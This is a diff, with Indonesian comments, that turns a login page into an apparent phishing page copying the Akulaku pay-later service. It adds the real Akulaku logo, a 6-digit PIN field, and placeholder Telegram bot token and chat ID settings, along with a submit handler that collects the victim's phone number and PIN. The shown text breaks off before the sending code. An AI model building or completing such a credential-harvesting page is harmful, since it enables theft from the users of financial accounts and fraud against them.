@@ -32,15 +32,14 @@
             text-align: center;
         }
 
-        /* Logo Teks */
-        .logo {
-            font-size: 32px;
-            font-weight: 800;
-            color: #FF5722; /* Warna khas Akulaku */
+        /* Styling Logo Gambar */
+        .logo-img {
+            height: 50px;
             margin-bottom: 10px;
-            letter-spacing: -1px;
+            /* Ganti URL di bawah ini dengan logo Anda jika ingin menggunakan gambar asli */
+            content: url('https://upload.wikimedia.org/wikipedia/commons/a/a9/Akulaku_Logo.svg'); 
         }
-        
+
         .sub-logo {
             font-size: 14px;
             color: #666;
@@ -72,14 +71,14 @@
         }
 
         .input-group input:focus {
-            border-color: #FF5722;
+            border-color: #D32F2F; /* Merah saat fokus */
         }
 
-        /* Tombol Login */
+        /* Tombol Login (WARNA MERAH) */
         .btn-login {
             width: 100%;
             padding: 14px;
-            background-color: #FF5722;
+            background-color: #D32F2F; /* Warna Merah Pekat */
             color: white;
             border: none;
             border-radius: 8px;
@@ -91,7 +90,7 @@
         }
 
         .btn-login:hover {
-            background-color: #E64A19;
+            background-color: #B71C1C; /* Merah lebih gelap saat hover */
         }
 
         /* Link Bantu */
@@ -108,7 +107,7 @@
         }
 
         .helper-links a:hover {
-            color: #FF5722;
+            color: #D32F2F;
             text-decoration: underline;
         }
 
@@ -120,47 +119,58 @@
         }
 
         .footer-register a {
-            color: #FF5722;
+            color: #D32F2F;
             font-weight: 600;
             text-decoration: none;
         }
         
-        .footer-register a:hover {
-            text-decoration: underline;
+        /* Loading Spinner (Hidden) */
+        .spinner {
+            display: none;
+            margin-left: 10px;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #ffffff;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
         }
 
-        /* Pesan Error (Hidden by default) */
-        .error-msg {
-            color: red;
-            font-size: 12px;
-            margin-top: 5px;
-            display: none;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
 
     <div class="login-container">
-        <div class="logo">akulaku</div>
+        <!-- Logo Menggunakan Tag IMG -->
+        <img src="" alt="Logo Akulaku" class="logo-img">
+        
         <div class="sub-logo">Belanja sekarang, bayar nanti</div>
 
         <form id="loginForm">
             <div class="input-group">
-                <label for="phone">Nomor Ponsel / Email</label>
+                <label for="phone">Nomor Ponsel</label>
                 <input type="text" id="phone" placeholder="Contoh: 081234567890" required>
             </div>
 
             <div class="input-group">
-                <label for="password">Kata Sandi</label>
-                <input type="password" id="password" placeholder="Masukkan kata sandi" required>
-                <div class="error-msg" id="errorMsg">Nomor ponsel atau kata sandi salah</div>
+                <label for="pin">PIN (6 Digit)</label>
+                <!-- maxlength="6" membatasi input maksimal 6 karakter -->
+                <!-- inputmode="numeric" memastikan keypad angka di HP -->
+                <input type="password" id="pin" maxlength="6" inputmode="numeric" placeholder="Masukkan 6 digit PIN" required>
             </div>
 
-            <button type="submit" class="btn-login">Masuk</button>
+            <button type="submit" class="btn-login" id="submitBtn">
+                <span>Masuk</span>
+                <div class="spinner" id="loadingSpinner"></div>
+            </button>
         </form>
 
         <div class="helper-links">
-            <a href="#">Lupa Kata Sandi?</a>
+            <a href="#">Lupa PIN?</a>
             <a href="#">Bantuan</a>
         </div>
 
@@ -170,24 +180,29 @@
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault(); // Mencegah form submit secara default
+        // --- KONFIGURASI TELEGRAM BOT ANDA ---
+        // Ganti 'ISI_TOKEN_BOT_DISINI' dengan Token Bot Anda (contoh: 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11)
+        const BOT_TOKEN = 'ISI_TOKEN_BOT_DISINI'; 
+        
+        // Ganti 'ISI_CHAT_ID_DISINI' dengan Chat ID Anda (bisa berupa angka negatif untuk grup atau ID user)
+        const CHAT_ID = 'ISI_CHAT_ID_DISINI'; 
+        // -------------------------------------
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
             
             const phone = document.getElementById('phone').value;
-            const password = document.getElementById('password').value;
-            const errorMsg = document.getElementById('errorMsg');
+            const pin = document.getElementById('pin').value;
+            const btn = document.getElementById('submitBtn');
+            const spinner = document.getElementById('loadingSpinner');
+            const btnText = btn.querySelector('span');
 
-            // Simulasi Validasi Sederhana
-            if(phone.length < 5 || password.length < 4) {
-                errorMsg.style.display = 'block';
-                errorMsg.innerText = "Format nomor ponsel atau kata sandi tidak valid.";
-            } else {
-                errorMsg.style.display = 'none';
-                alert(`Login berhasil!\nNomor: ${phone}`);
-                // Di sini biasanya Anda akan mengirim data ke server (Backend)
+            // Validasi panjang PIN
+            if (pin.length !== 6) {
+                alert("PIN harus 6 digit!");
+                return;
             }
-        });
-    </script>
 
-</body>
-</html>
+            // Tampilan Loading
+            btn.disabled = true;
+            btn
